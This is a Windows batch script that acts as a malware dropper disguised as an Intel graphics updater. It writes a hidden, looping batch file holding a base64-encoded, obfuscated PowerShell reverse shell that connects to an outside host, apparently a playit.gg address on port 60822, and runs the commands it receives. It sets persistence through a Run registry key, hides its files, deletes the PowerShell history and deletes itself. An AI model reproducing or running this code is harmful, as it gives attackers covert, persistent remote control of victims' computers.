@echo off

cd %TEMP%

PoWErShELl -w 1 attrib -h .\IntelGraphicX.bat && attrib -h .\IntelGraphicsCommandCenterUpdater_AutoLauncher-V.20.2.3.vbs && erase /Q  .\IntelGraphicX.bat && erase /Q IntelGraphicsCommandCenterUpdater_AutoLauncher-V.20.2.3.vbs

echo @echo off > IntelGraphicX.bat
echo :loop >> IntelGraphicX.bat
echo timeout /t 15 >> IntelGraphicX.bat
echo pOwErshELl -w 1 -EnC "ZABvACAAewAKACAAIAAgACAAJgAgACgAKAAiAFkASQBRAGsAMgAwAEsALQBUAHEAVQBBAGUAVwBpADQANwBaAHAAcgBDAFYARABKAHoAeABoAG4AeQBMAGQANQBPAFgAZgBjADEANgBGAFIARQBvAGcARwBTAGwAdwBhAHQAOABOAHUAdgAzAGoAUABzAGIAQgBIAE0AOQBtACIAKQBbADQANAAsADQAOAAsADQANwAsADEAOQAsADQAOAAsADcALAA0ADQALAA0ADUALAAxADIALAAxADIALAAxADgAXQAgAC0AagBvAGkAbgAgACcAJwApACAALQBTAGUAYwBvAG4AZABzACAAMAAuADAANQAKACAAIAAgACAAdAByAHkAewAKACAAIAAgACAAIAAgACAAIAAkAEsAYQB0AGEAbgBhACAAPQAgACYAIAAoACgAIgBjADkAWgBoADgANgA3AGIATQBOADMAdgB0AHUASQAwAEQAcgBvAEMASAAtAHAATABlAFIAZgBrAE8AbQBnAEIAUwA0AFQAdwBFAFcAMQBHAEsAbAB4AGoAZABZAFgAbgBRAHMAUAAyAEEAeQBWAEoANQBGAHoAcQBhAFUAaQAiACkAWwA5ACwAMgA0ACwAMwA1ACwAMgAxACwAMgA4ACwANwAsADQAMwAsADIANAAsADAALAAxADIAXQAgAC0AagBvAGkAbgAgACcAJwApACAATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAnAG4AZQBlAGQAcwAtAGgAbwBtAGUAbABlAHMAcwAuAGEAdAAuAHAAbAB5AC4AZwBnACcALAAgADYAMAA4ADIAMgApAAoAIAAgACAAIAB9ACAAYwBhAHQAYwBoACAAewB9AAoAfQAgAHUAbgB0AGkAbAAgACgAJABLAGEAdABhAG4AYQAuAEMAbwBuAG4AZQBjAHQAZQBkACkACgAkAFMAYQBtAHUAcgBhAGkAIAA9ACAAKAAoACQASwBhAHQAYQBuAGEALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAKQApAAoAJABTAHcAbwByAGQAIAA9ACAAJgAgACgAKAAiAGMAOQBaAGgAOAA2ADcAYgBNAE4AMwB2AHQAdQBJADAARAByAG8AQwBIAC0AcABMAGUAUgBmAGsATwBtAGcAQgBTADQAVAB3AEUAVwAxAEcASwBsAHgAagBkAFkAWABuAFEAcwBQADIAQQB5AFYASgA1AEYAegBxAGEAVQBpACIAKQBbADkALAAyADQALAAzADUALAAyADEALAAyADgALAA3ACwANAAzACwAMgA0ACwAMAAsADEAMgBdACAALQBqAG8AaQBuACAAJwAnACkAIABJAE8ALgBTAHQAcgBlAGEAbQBXAHIAaQB0AGUAcgAoACQAUwBhAG0AdQByAGEAaQApAAoAZgB1AG4AYwB0AGkAbwBuACAAUwB3AGUAYQB0ACAAKAAkAFMAdAByAGkAbgBnACkAIAB7AAoAIAAgACAAIABbAGIAeQB0AGUAWwBdAF0AJABzAGMAcgBpAHAAdAA6AEIAdQBmAGYAZQByACAAPQAgADAALgAuACQASwBhAHQAYQBuAGEALgBSAGUAYwBlAGkAdgBlAEIAdQBmAGYAZQByAFMAaQB6AGUAIAB8ACUAewAkACgAJABfACkAfQB8ACAAJQAgAHsAMAB9AAoAIAAgACAAIAAkAFMAdwBvAHIAZAAuAFcAcgBpAHQAZQAoACQAUwB0AHIAaQBuAGcAIAArACAAJwBQAFMAIAAnACAAKwAgACgAJgAgACgAKAAiAE8AQgBxAHQASABhAGcAMAA0AG8AcgA2AFQAeQBiADMAaABSAGsAegBNAGoASgBHADkAbgB1AG0AcwBMADEARQA1ADgAdgBGAE4ALQBjAGkAZQA3AEEAdwB4AFUAWABLAFAAZgBWAFEARABZAEMAVwBJAFMAbABaADIAcABkACIAKQBbADIAMwAsADQAMAAsADMALAAzADcALAAyADkALAA5ACwAMwA4ACwANQAsADMALAAzADkALAA5ACwAMgA1AF0AIAAtAGoAbwBpAG4AIAAnACcAKQApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnACkACgAgACAAIAAgACQAKAAkACgAJAAoACYAIAAoACgAIgBMAE0AagBYAFAAVwA1AHAAdABSAFoAcQB3AFMATwA5AEEAaQAtAGQANwBhAEsAQgBHAEkAbQBuAE4ASgB2AGgAVQBZADIARQBrAEgAdQAxAEYAYwAwAFYAOABvADMARABsAHkAZwB4AGYAegA2AFQAUQBDADQAcwByAGIAZQAiACkAWwAxADcALAAyADcALAAzADAALAA0ADUALAAzADYALAA2ADIALAAxADgALAA2ADIALAA1ADEALAA3ACwANgAwACwANgAyACwANQA5ACwANQA5ACwAMQA3ACwANAA1ACwAMgA3AF0AIAAtAGoAbwBpAG4AIAAnACcAKQAoAFsAcwB0AHIAaQBuAGcAXQA6ADoAagBvAGkAbgAoACcAJwAsACAAKAAgACgAMwA2ACwAOAAzACwAMQAxADkALAAxADEAMQAsADEAMQA0ACwAMQAwADAALAA0ADYALAA3ADAALAAxADAAOAAsADEAMQA3ACwAMQAxADUALAAxADAANAAsADQAMAAsADQAMQApACAAfAAlAHsAIAAoACAAWwBjAGgAYQByAF0AWwBpAG4AdABdACAAJABfACkAfQApACkAIAB8ACAAJQAgAHsAJABfAH0AKQApACkAKQAKAH0ACgBTAHcAZQBhAHQAIAAnACcACgB3AGgAaQBsAGUAKAAoACQAQgB5AHQAZQBzAFIAZQBhAGQAIAA9ACAAJABTAGEAbQB1AHIAYQBpAC4AUgBlAGEAZAAoACQAQgB1AGYAZgBlAHIALAAgADAALAAgACQAQgB1AGYAZgBlAHIALgBMAGUAbgBnAHQAaAApACkAIAAtAGcAdAAgADAAKQAgAHsAIAAgACAACgAgACAAIAAgACQAQgB1AGwAbABlAHQAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAQgB1AGYAZgBlAHIALAAgADAALAAgACQAQgB5AHQAZQBzAFIAZQBhAGQAIAAtACAAMQApAAoAIAAgACAAIAAkAEEAcgByAG8AdwBzACAAPQAgAHQAcgB5ACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACYAIAAoAFsAcwB0AHIAaQBuAGcAXQA6ADoAagBvAGkAbgAoACcAJwAsACAAKAAgACgANwAzACwAMQAxADAALAAxADEAOAAsADEAMQAxACwAMQAwADcALAAxADAAMQAsADQANQAsADYAOQAsADEAMgAwACwAMQAxADIALAAxADEANAAsADEAMAAxACwAMQAxADUALAAxADEANQAsADEAMAA1ACwAMQAxADEALAAxADEAMAApACAAfAAlAHsAJABfAH0AfAAlAHsAIAAoACAAWwBjAGgAYQByAF0AWwBpAG4AdABdACAAJAAoACQAXwApACkAfQApACkAIAB8ACUAewAkAF8AfQB8ACAAJQAgAHsAJABfAH0AKQAgACQAQgB1AGwAbABlAHQAIAAyAD4AJgAxACAAfAAlAHsAJAAoACQAXwApAH0AfAAgACYAIAAoACgAIgBrADcAbABoADEAUgBiAGcASgA4AHQAagBkAEIAcwB3AEkANQB2ADQAOQBDAFcAYwB6AGEAMwBtAG8ATwBLAE4AVgBBAFgAUABRADAANgBZAEYAWgBlAC0AbgBMAFUAeAB5AEcAcgBwAGkAVABTAHUASABFAGYARABxADIATQAiACkAWwAyADkALAA1ADUALAAxADAALAA0ADMALAA1ADQALAAxADAALAA1ADAALAA1ADIALAA0ADQALAA3AF0AIAAtAGoAbwBpAG4AIAAnACcAKQAKACAAIAAgACAAIAAgACAAIAB9ACAAYwBhAHQAYwBoACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAKAAkAF8AKQAgAHwAJQB7ACQAKAAkAF8AKQB9AHwAIAAmACAAKAAoACIAawA3AGwAaAAxAFIAYgBnAEoAOAB0AGoAZABCAHMAdwBJADUAdgA0ADkAQwBXAGMAegBhADMAbQBvAE8ASwBOAFYAQQBYAFAAUQAwADYAWQBGAFoAZQAtAG4ATABVAHgAeQBHAHIAcABpAFQAUwB1AEgARQBmAEQAcQAyAE0AIgApAFsAMgA5ACwANQA1ACwAMQAwACwANAAzACwANQA0ACwAMQAwACwANQAwACwANQAyACwANAA0ACwANwBdACAALQBqAG8AaQBuACAAJwAnACkACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAUwB3AGUAYQB0ACAAKAAkAEEAcgByAG8AdwBzACkACgB9AAoAJAAoACgAJgAgACgAWwBzAHQAcgBpAG4AZwBdADoAOgBqAG8AaQBuACgAJwAnACwAIAAoACAAKAAxADAANQAsADEAMQAwACwAMQAxADgALAAxADEAMQAsADEAMAA3ACwAMQAwADEALAA0ADUALAAxADAAMQAsADEAMgAwACwAMQAxADIALAAxADEANAAsADEAMAAxACwAMQAxADUALAAxADEANQAsADEAMAA1ACwAMQAxADEALAAxADEAMAApACAAfAAlAHsAIAAoACAAWwBjAGgAYQByAF0AWwBpAG4AdABdACAAJABfACkAfQApACkAIAB8ACAAJQAgAHsAJABfAH0AKQAoAFsAcwB0AHIAaQBuAGcAXQA6ADoAagBvAGkAbgAoACcAJwAsACAAKAAgACgAMwA2ACwAOAAzACwAMQAxADkALAAxADEAMQAsADEAMQA0ACwAMQAwADAALAA0ADYALAA2ADcALAAxADAAOAAsADEAMQAxACwAMQAxADUALAAxADAAMQAsADQAMAAsADQAMQApACAAfAAlAHsAIAAoACAAWwBjAGgAYQByAF0AWwBpAG4AdABdACAAJABfACkAfQApACkAIAB8ACAAJQAgAHsAJABfAH0AKQApACkACgA=" >> IntelGraphicX.bat
echo goto loop >> IntelGraphicX.bat

echo Dim WinScriptHost > IntelGraphicsCommandCenterUpdater_AutoLauncher-V.20.2.3.vbs
echo Set WinScriptHost ^= CreateObject^("WScript.Shell") >> IntelGraphicsCommandCenterUpdater_AutoLauncher-V.20.2.3.vbs
echo WinScriptHost.Run Chr^(34^) ^& "%TEMP%\IntelGraphicX.bat" ^& Chr^(34^)^, 0 >> IntelGraphicsCommandCenterUpdater_AutoLauncher-V.20.2.3.vbs
echo Set WinScriptHost ^= Nothing >> IntelGraphicsCommandCenterUpdater_AutoLauncher-V.20.2.3.vbs

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /f /v MicrosoftIntelGraphicS /t REG_SZ /d "%TEMP%\IntelGraphicsCommandCenterUpdater_AutoLauncher-V.20.2.3.vbs"

attrib +h .\IntelGraphicX.bat && attrib +h .\IntelGraphicsCommandCenterUpdater_AutoLauncher-V.20.2.3.vbs

PoWErShElL -w 1 Remove-Item (Get-PSReadlineOption).HistorySavePath
(goto) 2>nul & del "%~f0"
